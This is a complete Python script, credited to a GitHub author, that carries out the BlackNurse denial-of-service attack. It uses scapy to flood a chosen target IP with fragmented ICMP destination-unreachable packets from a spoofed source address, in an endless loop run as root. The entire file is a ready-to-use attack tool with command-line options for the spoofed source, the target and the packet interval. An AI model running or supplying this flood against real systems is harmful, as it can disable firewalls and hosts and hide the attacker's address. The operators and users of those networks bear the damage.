#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    BlackNurse attack by opsxcq (github.com/opsxcq/) 
"""

from scapy.all import *
from time import sleep
from os import geteuid
from sys import argv, exit
from argparse import ArgumentParser

def exploit(source, target, interval=0.001):
    """BlackNurse attack"""

    while 1:
        send(fragment(IP(dst=target,src=source)/ICMP(type=3,code=0)/('deadbeef')),verbose=0)
        send(fragment(IP(dst=target,src=source)/ICMP(type=3,code=1)/('deadbeef')),verbose=0)
        send(fragment(IP(dst=target,src=source)/ICMP(type=3,code=2)/('deadbeef')),verbose=0)
        sleep(interval)

if __name__ == "__main__":
    ap = ArgumentParser(description="BlackNurse ICMP DOS Attack")
    ap.add_argument("-s", "--source", required=True, help="Spoofed source IP address")
    ap.add_argument("-t", "--target", required=True, help="Target's IP address")
    ap.add_argument("-I", "--interval", type=float, default=0, help="Interval between packets")
    args = vars(ap.parse_args())

    if not geteuid() == 0:
        exit("[!] You must be root")

    try:
        print("[*] Starting BlackNurse attack")
        exploit(args["source"], args["target"], args["interval"])
    except IOError:
        exit("[!] Error sending packets")
    except KeyboardInterrupt:
        print("\n[*] Stopping BlackNurse attack")
